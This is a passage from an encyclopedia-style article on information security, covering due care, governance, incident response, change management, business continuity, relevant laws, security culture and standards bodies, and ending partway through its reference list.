 The 
length and strength
 of the encryption key is also an important consideration.
[
224
]
 A key that is 
weak
 or too short will produce 
weak encryption
.
[
224
]
 The keys used for encryption and decryption must be protected with the same degree of rigor as any other confidential information.
[
225
]
 They must be protected from unauthorized disclosure and destruction, and they must be available when needed.
[
citation needed
]
 
Public key infrastructure
 (PKI) solutions address many of the problems that surround 
key management
.
[
94
]




Process
[
edit
]


The terms "reasonable and prudent person", "
due care
", and "due diligence" have been used in the fields of finance, securities, and law for many years. In recent years these terms have found their way into the fields of computing and information security.
[
129
]
 U.S. 
Federal Sentencing Guidelines
 now make it possible to hold corporate officers liable for failing to exercise due care and due diligence in the management of their information systems.
[
226
]


In the business world, stockholders, customers, business partners, and governments have the expectation that corporate officers will run the business in accordance with accepted business practices and in compliance with laws and other regulatory requirements. This is often described as the "reasonable and prudent person" rule. A prudent person takes due care to ensure that everything necessary is done to operate the business by sound business principles and in a legal, ethical manner. A prudent person is also diligent (mindful, attentive, ongoing) in their due care of the business.

In the field of information security, Harris
[
227
]

offers the following definitions of due care and due diligence:



"Due care are steps that are taken to show that a company has taken responsibility for the activities that take place within the corporation and has taken the necessary steps to help protect the company, its resources, and employees
[
228
]
."
 And, [Due diligence are the] 
"continual activities that make sure the protection mechanisms are continually maintained and operational."
[
229
]




Attention should be made to two important points in these definitions.
[
230
]
[
231
]
 First, in due care, steps are taken to show; this means that the steps can be verified, measured, or even produce tangible artifacts.
[
232
]
[
233
]
 Second, in due diligence, there are continual activities; this means that people are actually doing things to monitor and maintain the protection mechanisms, and these activities are ongoing.
[
234
]


Organizations have a responsibility with practicing duty of care when applying information security. The Duty of Care Risk Analysis Standard (DoCRA)
[
235
]
 provides principles and practices for evaluating risk.
[
236
]
 It considers all parties that could be affected by those risks.
[
237
]
 DoCRA helps evaluate safeguards if they are appropriate in protecting others from harm while presenting a reasonable burden.
[
238
]
 With increased data breach litigation, companies must balance security controls, compliance, and its mission.
[
239
]




Security governance
[
edit
]


See also: 
Information Security Governance


The 
Software Engineering Institute
 at 
Carnegie Mellon University
, in a publication titled 
Governing for Enterprise Security (GES) Implementation Guide
, defines characteristics of effective security governance. These include:
[
240
]




An enterprise-wide issue


Leaders are accountable


Viewed as a business requirement


Risk-based


Roles, responsibilities, and segregation of duties defined


Addressed and enforced in policy


Adequate resources committed


Staff aware and trained


A development life cycle requirement


Planned, managed, measurable, and measured


Reviewed and audited


Incident response plans
[
edit
]


This section 
needs expansion
. You can help by 
adding to it
.  
(
January 2018
)


An incident response plan (IRP) is a group of policies that dictate an organizations reaction to a cyber attack. Once an security breach has been identified, for example by 
network intrusion detection system
 (NIDS) or 
host-based intrusion detection system
 (HIDS) (if configured to do so),  the plan is initiated.
[
241
]
 It is important to note that there can be legal implications to a data breach. Knowing local and federal laws is critical.
[
242
]
 Every plan is unique to the needs of the organization, and it can involve skill sets that are not part of an IT team.
[
243
]
 For example, a lawyer may be included in the response plan to help navigate legal implications to a data breach.
[
citation needed
]


As mentioned above every plan is unique but most plans will include the following:
[
244
]




Preparation
[
edit
]


Good preparation includes the development of an incident response team (IRT).
[
245
]
 Skills need to be used by this team would be, penetration testing, computer forensics, network security, etc.
[
246
]
 This team should also keep track of trends in 
cybersecurity
 and modern attack strategies.
[
247
]
 A training program for end users is important as well as most modern attack strategies target users on the network.
[
244
]




Identification
[
edit
]


This part of the incident response plan identifies if there was a security event.
[
248
]
 When an end user reports information or an admin notices irregularities, an investigation is launched. An incident log is a crucial part of this step.
[
citation needed
]
 All of the members of the team should be updating this log to ensure that information flows as fast as possible.
[
249
]
 If it has been identified that a security breach has occurred the next step should be activated.
[
250
]




Containment
[
edit
]


In this phase, the IRT works to isolate the areas that the breach took place to limit the scope of the security event.
[
251
]
 During this phase it is important to preserve information forensically so it can be analyzed later in the process.
[
252
]
 Containment could be as simple as physically containing a server room or as complex as segmenting a network to not allow the spread of a virus.
[
253
]




Eradication
[
edit
]


This is where the threat that was identified is removed from the affected systems.
[
254
]
 This could include deleting malicious files, terminating compromised accounts, or deleting other components.
[
255
]
[
256
]
 Some events do not require this step, however it is important to fully understand the event before moving to this step.
[
257
]
 This will help to ensure that the threat is completely removed.
[
253
]




Recovery
[
edit
]


This stage is where the systems are restored back to original operation.
[
258
]
 This stage could include the recovery of data, changing user access information, or updating firewall rules or policies to prevent a breach in the future.
[
259
]
[
260
]
 Without executing this step, the system could still be vulnerable to future security threats.
[
253
]




Lessons learned
[
edit
]


In this step information that has been gathered during this process is used to make future decisions on security.
[
261
]
 This step is crucial to the ensure that future events are prevented. Using this information to further train admins is critical to the process.
[
262
]
 This step can also be used to process information that is distributed from other entities who have experienced a security event.
[
263
]




Change management
[
edit
]


Main article: 
Change management (ITSM)


Change management is a formal process for directing and controlling alterations to the information processing environment.
[
264
]
[
265
]
 This includes alterations to desktop computers, the network, servers, and software.
[
266
]
 The objectives of change management are to reduce the risks posed by changes to the information processing environment and improve the stability and reliability of the processing environment as changes are made.
[
267
]
 It is not the objective of change management to prevent or hinder necessary changes from being implemented.
[
268
]
[
269
]


Any change to the information processing environment introduces an element of risk.
[
270
]
 Even apparently simple changes can have unexpected effects.
[
271
]
 One of management's many responsibilities is the management of risk.
[
272
]
[
273
]
 Change management is a tool for managing the risks introduced by changes to the information processing environment.
[
274
]
 Part of the change management process ensures that changes are not implemented at inopportune times when they may disrupt critical business processes or interfere with other changes being implemented.
[
275
]


Not every change needs to be managed.
[
276
]
[
277
]
 Some kinds of changes are a part of the everyday routine of information processing and adhere to a predefined procedure, which reduces the overall level of risk to the processing environment.
[
278
]
 Creating a new user account or deploying a new desktop computer are examples of changes that do not generally require change management.
[
279
]
 However, relocating user file shares, or upgrading the Email server pose a much higher level of risk to the processing environment and are not a normal everyday activity.
[
280
]
 The critical first steps in change management are (a) defining change (and communicating that definition) and (b) defining the scope of the change system.
[
281
]


Change management is usually overseen by a change review board composed of representatives from key business areas,
[
282
]
 security, networking, systems administrators, database administration, application developers, desktop support, and the help desk.
[
283
]
 The tasks of the change review board can be facilitated with the use of automated work flow application.
[
284
]
 The responsibility of the change review board is to ensure the organization's documented change management procedures are followed.
[
285
]
 The change management process is as follows
[
286
]




Request
: Anyone can request a change.
[
287
]
[
288
]
 The person making the change request may or may not be the same person that performs the analysis or implements the change.
[
289
]
[
290
]
 When a request for change is received, it may undergo a preliminary review to determine if the requested change is compatible with the organizations 
business model
 and practices, and to determine the amount of resources needed to implement the change.
[
291
]


Approve
: Management runs the business and controls the allocation of resources therefore, management must approve requests for changes and assign a priority for every change.
[
292
]
 Management might choose to reject a change request if the change is not compatible with the business model, industry standards or best practices.
[
293
]
[
294
]
 Management might also choose to reject a change request if the change requires more resources than can be allocated for the change.
[
295
]


Plan
: Planning a change involves discovering the scope and impact of the proposed change; analyzing the complexity of the change; allocation of resources and, developing, testing, and documenting both implementation and back-out plans.
[
296
]
 Need to define the criteria on which a decision to back out will be made.
[
297
]


Test
: Every change must be tested in a safe test environment, which closely reflects the actual production environment, before the change is applied to the production environment.
[
298
]
 The backout plan must also be tested.
[
299
]


Schedule
: Part of the change review board's responsibility is to assist in the scheduling of changes by reviewing the proposed implementation date for potential conflicts with other scheduled changes or critical business activities.
[
300
]


Communicate
: Once a change has been scheduled it must be communicated.
[
301
]
 The communication is to give others the opportunity to remind the change review board about other changes or critical business activities that might have been overlooked when scheduling the change.
[
302
]
 The communication also serves to make the help desk and users aware that a change is about to occur.
[
303
]
 Another responsibility of the change review board is to ensure that scheduled changes have been properly communicated to those who will be affected by the change or otherwise have an interest in the change.
[
304
]
[
305
]


Implement
: At the appointed date and time, the changes must be implemented.
[
306
]
[
307
]
 Part of the planning process was to develop an implementation plan, testing plan and, a back out plan.
[
308
]
[
309
]
 If the implementation of the change should fail or, the post implementation testing fails or, other "drop dead" criteria have been met, the back out plan should be implemented.
[
310
]


Document
: All changes must be documented.
[
311
]
[
312
]
 The documentation includes the initial request for change, its approval, the priority assigned to it, the implementation,
[
313
]
 testing and back out plans, the results of the change review board critique, the date/time the change was implemented,
[
314
]
 who implemented it, and whether the change was implemented successfully, failed or postponed.
[
315
]
[
316
]


Post-change review
: The change review board should hold a post-implementation review of changes.
[
317
]
 It is particularly important to review failed and backed out changes. The review board should try to understand the problems that were encountered, and look for areas for improvement.
[
317
]


Change management procedures that are simple to follow and easy to use can greatly reduce the overall risks created when changes are made to the information processing environment.
[
318
]
 Good change management procedures improve the overall quality and success of changes as they are implemented.
[
319
]
 This is accomplished through planning, peer review, documentation, and communication.
[
320
]


ISO/IEC 20000
, The Visible OPS Handbook: Implementing ITIL in 4 Practical and Auditable Steps
[
321
]
 (Full book summary),
[
322
]
 and 
ITIL
 all provide valuable guidance on implementing an efficient and effective change management program information security.
[
323
]




Business continuity
[
edit
]


Business continuity management (
BCM
) concerns arrangements aiming to protect an organization's critical business functions from interruption due to incidents, or at least minimize the effects.
[
324
]
[
325
]
 BCM is essential to any organization to keep technology and business in line with current threats to the continuation of business as usual.
[
326
]
 The BCM should be included in an organizations 
risk analysis
 plan to ensure that all of the necessary business functions have what they need to keep going in the event of any type of threat to any business function.
[
327
]


It encompasses:



Analysis of requirements, e.g., identifying critical business functions, dependencies and potential failure points, potential threats and hence incidents or risks of concern to the organization;
[
328
]
[
329
]


Specification, e.g., maximum tolerable outage periods; recovery point objectives (maximum acceptable periods of data loss);
[
330
]


Architecture and design, e.g., an appropriate combination of approaches including resilience (e.g. engineering IT systems and processes for high availability,
[
331
]
 avoiding or preventing situations that might interrupt the business), incident and emergency management (e.g., evacuating premises, calling the emergency services, triage/situation
[
332
]
 assessment and invoking recovery plans), recovery (e.g., rebuilding) and contingency management (generic capabilities to deal positively with whatever occurs using whatever resources are available);
[
333
]


Implementation, e.g., configuring and scheduling backups, data transfers, etc., duplicating and strengthening critical elements; contracting with service and equipment suppliers;


Testing, e.g., business continuity exercises of various types, costs and assurance levels;
[
334
]


Management, e.g., defining strategies, setting objectives and goals; planning and directing the work; allocating funds, people and other resources; prioritization relative to other activities; team building, leadership, control, motivation and coordination with other business functions and activities
[
335
]
 (e.g., IT, facilities, human resources, risk management, information risk and security, operations); monitoring the situation, checking and updating the arrangements when things change; maturing the approach through continuous improvement, learning and appropriate investment;
[
citation needed
]


Assurance, e.g., testing against specified requirements; measuring, analyzing, and reporting key parameters; conducting additional tests, reviews and audits for greater confidence that the arrangements will go to plan if invoked.
[
336
]


Whereas BCM takes a broad approach to minimizing disaster-related risks by reducing both the probability and the severity of incidents, a 
disaster recovery plan
 (DRP) focuses specifically on resuming business operations as quickly as possible after a disaster.
[
337
]
 A disaster recovery plan, invoked soon after a disaster occurs, lays out the steps necessary to recover critical 
information and communications technology
 (ICT) infrastructure.
[
338
]
 Disaster recovery planning includes establishing a planning group, performing risk assessment, establishing priorities, developing recovery strategies, preparing inventories and documentation of the plan, developing verification criteria and procedure, and lastly implementing the plan.
[
339
]




Laws and regulations
[
edit
]


Privacy International
 2007 privacy ranking
green: Protections and safeguards
red: Endemic surveillance societies


Below is a partial listing of governmental laws and regulations in various parts of the world that have, had, or will have, a significant effect on data processing and information security.
[
340
]
[
341
]
 Important industry sector regulations have also been included when they have a significant impact on information security.
[
340
]




The UK 
Data Protection Act 1998
 makes new provisions for the regulation of the processing of information relating to individuals, including the obtaining, holding, use or disclosure of such information.
[
342
]
[
343
]
 The European Union Data Protection Directive (EUDPD) requires that all E.U. members adopt national regulations to standardize the protection of 
data privacy
 for citizens throughout the E.U.
[
344
]
[
345
]


The 
Computer Misuse Act
 1990 is an Act of the 
U.K. Parliament
 making computer crime (e.g., hacking) a criminal offense.
[
346
]
 The act has become a model upon which several other countries,
[
347
]
 including 
Canada
 and 
Ireland
, have drawn inspiration from when subsequently drafting their own information security laws.
[
348
]
[
349
]


The E.U.'s 
Data Retention Directive
 (annulled) required internet service providers and phone companies to keep data on every electronic message sent and phone call made for between six months and two years.
[
350
]


The 
Family Educational Rights and Privacy Act
 (FERPA) (
20 U.S.C.
 
§ 1232
 g; 34 CFR Part 99) is a U.S. Federal law that protects the privacy of student education records.
[
351
]
 The law applies to all schools that receive funds under an applicable program of the 
U.S. Department of Education
.
[
352
]
 Generally, schools must have written permission from the parent or eligible student
[
352
]
[
353
]
 in order to release any information from a student's education record.
[
354
]


The 
Federal Financial Institutions Examination Council
's (FFIEC) security guidelines for auditors specifies requirements for online banking security.
[
355
]


The 
Health Insurance Portability and Accountability Act
 (HIPAA) of 1996 requires the adoption of national standards for electronic health care transactions and national identifiers for providers, health insurance plans, and employers.
[
356
]
 Additionally, it requires health care providers, insurance providers and employers to safeguard the security and privacy of health data.
[
357
]


The 
Gramm–Leach–Bliley Act
 of 1999 (GLBA), also known as the Financial Services Modernization Act of 1999, protects the privacy and security of private financial information that financial institutions collect, hold, and process.
[
358
]


Section 404 of the 
Sarbanes–Oxley Act of 2002 (SOX)
 requires publicly traded companies to assess the effectiveness of their internal controls for financial reporting in annual reports they submit at the end of each fiscal year.
[
359
]
 Chief information officers are responsible for the security, accuracy, and the reliability of the systems that manage and report the financial data.
[
360
]
 The act also requires publicly traded companies to engage with independent auditors who must attest to, and report on, the validity of their assessments.
[
361
]


The 
Payment Card Industry Data Security Standard (PCI DSS)
 establishes comprehensive requirements for enhancing payment account data security.
[
362
]
 It was developed by the founding payment brands of the PCI Security Standards Council — including 
American Express
, 
Discover Financial Services
, JCB, MasterCard Worldwide,
[
363
]
 and 
Visa International
 — to help facilitate the broad adoption of consistent 
data security
 measures on a global basis.
[
364
]
 The PCI DSS is a multifaceted security standard that includes requirements for security management, policies, procedures, 
network architecture
, software design, and other critical protective measures.
[
365
]


State 
security breach notification laws
 (California and many others) require businesses, nonprofits, and state institutions to notify consumers when unencrypted "personal information" may have been compromised, lost, or stolen.
[
366
]


The Personal Information Protection and Electronics Document Act (
PIPEDA
) of Canada supports and promotes electronic commerce by protecting personal information that is collected, used or disclosed in certain circumstances,
[
367
]
[
368
]
 by providing for the use of electronic means to communicate or record information or transactions and by amending the 
Canada Evidence Act
, the Statutory Instruments Act and the Statute Revision Act.
[
369
]
[
370
]
[
371
]


Greece's Hellenic Authority for Communication Security and Privacy (ADAE) (Law 165/2011) establishes and describes the minimum information security controls that should be deployed by every company which provides electronic communication networks and/or services in Greece in order to protect customers' confidentiality.
[
372
]
 These include both managerial and technical controls (e.g., log records should be stored for two years).
[
373
]


Greece's Hellenic Authority for Communication Security and Privacy (ADAE) (Law 205/2013) concentrates around the protection of the integrity and availability of the services and data offered by Greek telecommunication companies.
[
374
]
 The law forces these and other related companies to build, deploy, and test appropriate business continuity plans and redundant infrastructures.
[
375
]


The US Department of Defense (DoD) issued DoD Directive 8570 in 2004, supplemented by DoD Directive 8140, requiring all DoD employees and all DoD contract personnel involved in information assurance roles and activities to earn and maintain various industry Information Technology (IT) certifications in an effort to ensure that all DoD personnel involved in network infrastructure defense have minimum levels of IT industry recognized knowledge, skills and abilities (KSA). Andersson and Reimers (2019) report these certifications range from CompTIA's A+ and Security+ through the ICS2.org's CISSP, etc.
[
376
]




Culture
[
edit
]


Describing more than simply how security aware employees are, information security culture is the ideas, customs, and social behaviors of an organization that impact information security in both positive and negative ways.
[
377
]
 Cultural concepts can help different segments of the organization work effectively or work against effectiveness towards information security within an organization. The way employees think and feel about security and the actions they take can have a big impact on information security in organizations. Roer & Petric (2017) identify seven core dimensions of information security culture in organizations:
[
378
]




Attitudes: employees' feelings and emotions about the various activities that pertain to the organizational security of information.
[
379
]


Behaviors: actual or intended activities and risk-taking actions of employees that have direct or indirect impact on information security.


Cognition: employees' awareness, verifiable knowledge, and beliefs regarding practices, activities, and 
self-efficacy
 relation that are related to information security.


Communication: ways employees communicate with each other, sense of belonging, support for security issues, and incident reporting.


Compliance: adherence to organizational security policies, awareness of the existence of such policies and the ability to recall the substance of such policies.


Norms: perceptions of security-related organizational conduct and practices that are informally deemed either normal or deviant by employees and their peers, e.g. hidden expectations regarding security behaviors and unwritten rules regarding uses of information-communication technologies.


Responsibilities: employees' understanding of the roles and responsibilities they have as a critical factor in sustaining or endangering the security of information, and thereby the organization.


Andersson and Reimers (2014) found that employees often do not see themselves as part of the organization Information Security "effort" and often take actions that ignore organizational information security best interests.
[
380
]
 Research shows information security culture needs to be improved continuously. In 
Information Security Culture from Analysis to Change
, authors commented, "It's a never ending process, a cycle of evaluation and change or maintenance." To manage the information security culture, five steps should be taken: pre-evaluation, strategic planning, operative planning, implementation, and post-evaluation.
[
381
]




Pre-evaluation: to identify the awareness of information security within employees and to analyze current security policy


Strategic planning: to come up a better awareness-program, we need to set clear targets. Clustering people is helpful to achieve it


Operative planning: create a good security culture based on internal communication, management buy-in, security awareness, and training programs


Implementation: should feature commitment of management, communication with organizational members, courses for all organizational members, and commitment of the employees
[
381
]


Post-evaluation: to better gauge the effectiveness of the prior steps and build on continuous improvement


Sources of standards
[
edit
]


Main article: 
Cyber Security Standards


The 
International Organization for Standardization
 (ISO) is an international standards organization organized as a consortium of national standards institutions from 167 countries, coordinated through a secretariat in Geneva, Switzerland. ISO is the world's largest developer of international standards. The 
International Electrotechnical Commission
 (IEC) is an international standards organization that deals with electrotechnology and cooperates closely with ISO. ISO/IEC 15443: "Information technology – Security techniques – A framework for IT security assurance", 
ISO/IEC 27002
: "Information technology – Security techniques – Code of practice for information security management", 
ISO/IEC 20000
: "Information technology – Service management", and 
ISO/IEC 27001
: "Information technology – Security techniques – Information security management systems – Requirements" are of particular interest to information security professionals.

The US 
National Institute of Standards and Technology
 (NIST) is a non-regulatory federal agency within the 
U.S. Department of Commerce
. The NIST Computer Security Division
develops standards, metrics, tests, and validation programs as well as publishes standards and guidelines to increase secure IT planning, implementation, management, and operation. NIST is also the custodian of the U.S. 
Federal Information Processing Standard
 publications (FIPS).

The Internet Society
 is a professional membership society with more than 100 organizations and over 20,000 individual members in over 180 countries. It provides leadership in addressing issues that confront the future of the internet, and it is the organizational home for the groups responsible for internet infrastructure standards, including the 
Internet Engineering Task Force
 (IETF) and the 
Internet Architecture Board
 (IAB). The ISOC hosts the Requests for Comments (RFCs) which includes the Official Internet Protocol Standards and the RFC-2196 
Site Security Handbook
.

The 
Information Security Forum
 (ISF) is a global nonprofit organization of several hundred leading organizations in financial services, manufacturing, telecommunications, consumer goods, government, and other areas. It undertakes research into information security practices and offers advice in its biannual 
Standard of Good Practice for Information Security
 and more detailed advisories for members.

The 
Institute of Information Security Professionals
 (IISP) is an independent, non-profit body governed by its members, with the principal objective of advancing the professionalism of information security practitioners and thereby the professionalism of the industry as a whole. The institute developed the IISP Skills Framework. This framework describes the range of competencies expected of information security and information assurance professionals in the effective performance of their roles. It was developed through collaboration between both private and public sector organizations, world-renowned academics, and security leaders.
[
382
]


The German 
Federal Office for Information Security
 (in German 
Bundesamt für Sicherheit in der Informationstechnik (BSI)
) BSI-Standards 100–1 to 100-4 are a set of recommendations including "methods, processes, procedures, approaches and measures relating to information security".
[
383
]
 The BSI-Standard 100-2 
IT-Grundschutz Methodology
 describes how information security management can be implemented and operated. The standard includes a very specific guide, the IT Baseline Protection Catalogs (also known as IT-Grundschutz Catalogs). Before 2005, the catalogs were formerly known as "
IT Baseline Protection
 Manual". The Catalogs are a collection of documents useful for detecting and combating security-relevant weak points in the IT environment (IT cluster). The collection encompasses as of September 2013 over 4,400 pages with the introduction and catalogs. The IT-Grundschutz approach is aligned with to the ISO/IEC 2700x family.

The 
European Telecommunications Standards Institute
 standardized a catalog of 
information security indicators
, headed by the Industrial Specification Group (ISG) ISI.



See also
[
edit
]




Backup


Capability-based security


Computer security
 (cybersecurity)


Data breach


Data-centric security


Enterprise information security architecture


Identity-based security


Information privacy


Information infrastructure


Information security audit


Information security indicators


Information security management


Information security standards


Information technology


Information technology security audit


IT risk


ITIL security management


Kill chain


List of computer security certifications


Mobile security


Network Security Services


Privacy engineering


Privacy software


Privacy-enhancing technologies


Security bug


Security convergence


Security information management


Security level management


Security of Information Act


Security service (telecommunication)


Single sign-on


Verification and validation




Gordon–Loeb model
 for cyber security investments


References
[
edit
]






^
 
Curry, Michael; Marshall, Byron; Crossler, Robert E.; Correia, John (April 25, 2018). 
"InfoSec Process Action Model (IPAM): Systematically Addressing Individual Security Behavior"
. 
ACM SIGMIS Database: The DATABASE for Advances in Information Systems
. 
49
 (SI): 49–66. 
doi
:
10.1145/3210530.3210535
. 
ISSN
 
0095-0033
. 
S2CID
 
14003960
.




^
 
Joshi, Chanchala; Singh, Umesh Kumar (August 2017). 
"Information security risks management framework – A step towards mitigating security risks in university network"
. 
Journal of Information Security and Applications
. 
35
: 128–137. 
doi
:
10.1016/j.jisa.2017.06.006
. 
ISSN
 
2214-2126
.




^
 
Fletcher, Martin (December 14, 2016). 
"An introduction to information risk"
. 
The National Archives
. Retrieved 
February 23,
 2022
.




^
 
Joshi, Chanchala; Singh, Umesh Kumar (August 2017). 
"Information security risks management framework – A step towards mitigating security risks in university network"
. 
Journal of Information Security and Applications
. 
35
: 128–137. 
doi
:
10.1016/j.jisa.2017.06.006
.




^
 
Daniel, Kent; Titman, Sheridan (August 2006). 
"Market Reactions to Tangible and Intangible Information"
. 
The Journal of Finance
. 
61
 (4): 1605–1643. 
doi
:
10.1111/j.1540-6261.2006.00884.x
. 
SSRN
 
414701
.




^
 
Fink, Kerstin (2004). 
Knowledge Potential Measurement and Uncertainty
. Deutscher Universitätsverlag. 
ISBN
 
978-3-322-81240-7
. 
OCLC
 
851734708
.




^
 
Keyser, Tobias (April 19, 2018), 
"Security policy"
, 
The Information Governance Toolkit
, CRC Press, pp. 57–62, 
doi
:
10.1201/9781315385488-13
, 
ISBN
 
978-1-315-38548-8
, retrieved 
May 28,
 2021




^
 
Danzig, Richard; National Defense University Washington DC Inst for National Strategic Studies (1995). 
"The big three: Our greatest security risks and how to address them"
. 
DTIC
 
ADA421883
.




^
 
Lyu, M.R.; Lau, L.K.Y. (2000). 
"Firewall security: Policies, testing and performance evaluation"
. 
Proceedings 24th Annual International Computer Software and Applications Conference. COMPSAC2000
. IEEE Comput. Soc. pp. 116–121. 
doi
:
10.1109/cmpsac.2000.884700
. 
ISBN
 
0-7695-0792-1
. 
S2CID
 
11202223
.




^
 
"How the Lack of Data Standardization Impedes Data-Driven Healthcare"
, 
Data-Driven Healthcare
, Hoboken, NJ, US: John Wiley & Sons, Inc., p. 29, October 17, 2015, 
doi
:
10.1002/9781119205012.ch3
, 
ISBN
 
978-1-119-20501-2
, retrieved 
May 28,
 2021




^
 
Lent, Tom; Walsh, Bill (2009), 
"Rethinking Green Building Standards for Comprehensive Continuous Improvement"
, 
Common Ground, Consensus Building and Continual Improvement: International Standards and Sustainable Building
, West Conshohocken, PA: ASTM International, pp. 1–1–10, 
doi
:
10.1520/stp47516s
, 
ISBN
 
978-0-8031-4507-8
, retrieved 
May 28,
 2021




^ 
a
 
b
 
Cherdantseva Y. and Hilton J.: "Information Security and Information Assurance. The Discussion about the Meaning, Scope and Goals". In: 
Organizational, Legal, and Technological Dimensions of Information System Administrator
. Almeida F., Portela, I. (eds.). IGI Global Publishing. (2013)




^
 
ISO/IEC 27000:2018 (E). (2018). Information technology – Security techniques – Information security management systems – Overview and vocabulary. ISO/IEC.




^
 
Committee on National Security Systems
: National Information Assurance (IA) Glossary, CNSS Instruction No. 4009, 26 April 2010.




^
 
ISACA. (2008). Glossary of terms, 2008. Retrieved from 
http://www.isaca.org/Knowledge-Center/Documents/Glossary/glossary.pdf




^
 
Pipkin, D. (2000). 
Information security: Protecting the global enterprise
. New York: Hewlett-Packard Company.




^
 
B., McDermott, E., & Geer, D. (2001). Information security is information risk management. In Proceedings of the 2001 Workshop on New Security Paradigms NSPW ‘01, (pp. 97 – 104). ACM. 
doi
:
10.1145/508171.508187




^
 
Anderson, J. M. (2003). "Why we need a new definition of information security". 
Computers & Security
. 
22
 (4): 308–313. 
doi
:
10.1016/S0167-4048(03)00407-3
.




^
 
Venter, H. S.; Eloff, J. H. P. (2003). "A taxonomy for information security technologies". 
Computers & Security
. 
22
 (4): 299–307. 
doi
:
10.1016/S0167-4048(03)00406-1
.




^
 
Gold, S (December 2004). 
"Threats looming beyond the perimeter"
. 
Information Security Technical Report
. 
9
 (4): 12–14. 
doi
:
10.1016/s1363-4127(04)00047-0
 (inactive August 12, 2024). 
ISSN
 
1363-4127
.
{{
cite journal
}}
:  CS1 maint: DOI inactive as of August 2024 (
link
)




^
 
Parker, Donn B. (January 1993). 
"A Comprehensive List of Threats To Information"
. 
Information Systems Security
. 
2
 (2): 10–14. 
doi
:
10.1080/19393559308551348
. 
ISSN
 
1065-898X
. 
S2CID
 
30661431
.




^
 
Sullivant, John (2016), 
"The Evolving Threat Environment"
, 
Building a Corporate Culture of Security
, Elsevier, pp. 33–50, 
doi
:
10.1016/b978-0-12-802019-7.00004-3
, 
ISBN
 
978-0-12-802019-7
, retrieved 
May 28,
 2021




^
 
Бучик, С. С.; Юдін, О. К.; Нетребко, Р. В. (December 21, 2016). 
"The analysis of methods of determination of functional types of security of the information-telecommunication system from an unauthorized access"
. 
Problems of Informatization and Management
. 
4
 (56). 
doi
:
10.18372/2073-4751.4.13135
. 
ISSN
 
2073-4751
.




^ 
a
 
b
 
Samonas, S.; Coss, D. (2014). 
"The CIA Strikes Back: Redefining Confidentiality, Integrity and Availability in Security"
. 
Journal of Information System Security
. 
10
 (3): 21–45. Archived from 
the original
 on September 22, 2018
. Retrieved 
January 25,
 2018
.




^
 
"Gartner Says Digital Disruptors Are Impacting All Industries; Digital KPIs Are Crucial to Measuring Success"
. Gartner. October 2, 2017
. Retrieved 
January 25,
 2018
.




^
 
"Gartner Survey Shows 42 Percent of CEOs Have Begun Digital Business Transformation"
. Gartner. April 24, 2017
. Retrieved 
January 25,
 2018
.




^
 
Forte, Dario; Power, Richard (December 2007). 
"Baseline controls in some vital but often-overlooked areas of your information protection programme"
. 
Computer Fraud & Security
. 
2007
 (12): 17–20. 
doi
:
10.1016/s1361-3723(07)70170-7
. 
ISSN
 
1361-3723
.




^
 
Low-voltage switchgear and controlgear. Device profiles for networked industrial devices
, BSI British Standards, 
doi
:
10.3403/bsen61915
, retrieved 
May 28,
 2021




^
 
Fetzer, James; Highfill, Tina; Hossiso, Kassu; Howells, Thomas; Strassner, Erich; Young, Jeffrey (November 2018). 
"Accounting for Firm Heterogeneity within U.S. Industries: Extended Supply-Use Tables and Trade in Value Added using Enterprise and Establishment Level Data"
. Working Paper Series. 
National Bureau of Economic Research
. 
doi
:
10.3386/w25249
. 
S2CID
 
169324096
.




^
 
"Secure estimation subject to cyber stochastic attacks"
, 
Cloud Control Systems
, Emerging Methodologies and Applications in Modelling, Elsevier: 373–404, 2020, 
doi
:
10.1016/b978-0-12-818701-2.00021-4
, 
ISBN
 
978-0-12-818701-2
, 
S2CID
 
240746156
, retrieved 
May 28,
 2021




^
 
Nijmeijer, H. (2003). 
Synchronization of mechanical systems
. World Scientific. 
ISBN
 
978-981-279-497-0
. 
OCLC
 
262846185
.




^
 
"How Students' Use of Computers has Evolved in Recent Years"
. 
Students, Computers and Learning
. PISA. 
OECD
. September 8, 2015. pp. 31–48. 
doi
:
10.1787/9789264239555-4-en
. 
ISBN
 
978-92-64-23954-8
. Retrieved 
November 30,
 2023
.




^
 
"9 Types of Cybersecurity Specializations"
.




^
 
Information technology. Security techniques. Competence requirements for information security management systems professionals
, BSI British Standards, 
doi
:
10.3403/30342674
, retrieved 
May 29,
 2021




^
 
"Information Security Qualifications Fact Sheet"
 
(PDF)
. 
IT Governance
. Archived from 
the original
 
(PDF)
 on March 16, 2018
. Retrieved 
March 16,
 2018
.




^
 
Ma, Ruiqing Ray (March 2016). 
"Flexible Displays Come in Many Forms"
. 
Information Display
. 
32
 (2): 4–49. 
doi
:
10.1002/j.2637-496x.2016.tb00883.x
. 
ISSN
 
0362-0972
.




^
 
Rahim, Noor H. (March 2006). 
Human Rights and Internal Security in Malaysia: Rhetoric and Reality
. Defense Technical Information Center. 
OCLC
 
74288358
.




^
 
Kramer, David (September 14, 2018). 
"Nuclear theft and sabotage threats remain high, report warns"
. 
Physics Today
 (9): 30951. 
Bibcode
:
2018PhT..2018i0951K
. 
doi
:
10.1063/pt.6.2.20180914a
. 
ISSN
 
1945-0699
. 
S2CID
 
240223415
.




^
 
Wilding, Edward (March 2, 2017). 
Information risk and security : preventing and investigating workplace computer crime
. Routledge. 
ISBN
 
978-1-351-92755-0
. 
OCLC
 
1052118207
.




^
 
Stewart, James (2012). 
CISSP Study Guide
. Canada: John Wiley & Sons. pp. 255–257. 
ISBN
 
978-1-118-31417-3
.




^
 
"Why has productivity growth declined?"
. 
OECD Economic Surveys: Denmark 2009
. 
OECD
. 2009. pp. 65–96. 
doi
:
10.1787/eco_surveys-dnk-2009-4-en
. 
ISBN
 
9789264076556
. Retrieved 
November 30,
 2023
.




^
 
"Identity Theft: The Newest Digital Attackking Industry Must Take Seriously"
. 
Issues in Information Systems
. 2007. 
doi
:
10.48009/2_iis_2007_297-302
. 
ISSN
 
1529-7314
.




^
 
Wendel-Persson, Anna; Ronnhed, Fredrik (2017). 
IT-säkerhet och människan : De har världens starkaste mur men porten står alltid på glänt
. Umeå universitet, Institutionen för informatik. 
OCLC
 
1233659973
.




^
 
Enge, Eric (April 5, 2017). 
"Stone Temple"
. Archived from 
the original
 on April 27, 2018
. Retrieved 
November 17,
 2017
.
 
Cell phones




^
 
Shao, Ruodan; Skarlicki, Daniel P. (2014). 
"Sabotage toward the Customers who Mistreated Employees Scale"
. 
PsycTESTS Dataset
. 
doi
:
10.1037/t31653-000
. Retrieved 
May 28,
 2021
.




^
 
Kitchen, Julie (June 2008). 
"7side – Company Information, Company Formations and Property Searches"
. 
Legal Information Management
. 
8
 (2): 146. 
doi
:
10.1017/s1472669608000364
. 
